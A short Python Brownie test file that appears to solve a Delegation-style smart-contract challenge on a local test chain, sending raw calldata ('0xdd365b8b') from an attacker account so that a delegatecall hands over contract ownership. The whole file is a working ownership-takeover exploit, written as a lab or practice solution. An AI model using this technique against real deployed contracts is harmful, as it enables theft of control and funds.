from brownie import accounts
from web3 import Web3

w3 = Web3(Web3.HTTPProvider("http://127.0.0.1:8545"))

from scripts.deploy import deploy_delegate_contracts, deploy_attack_delegation


def test_delegation_attack():
    ## Arrange
    delegation_contract = deploy_delegate_contracts()
    attacker = accounts[2]
    # Assert
    assert delegation_contract.owner() != attacker.address
    assert delegation_contract.owner() == accounts[0].address
    # Act / attack
    w3.eth.send_transaction(
        {
            "to": delegation_contract.address,
            "from": attacker.address,
            "data": "0xdd365b8b",
        }
    )
    assert delegation_contract.owner() == attacker.address
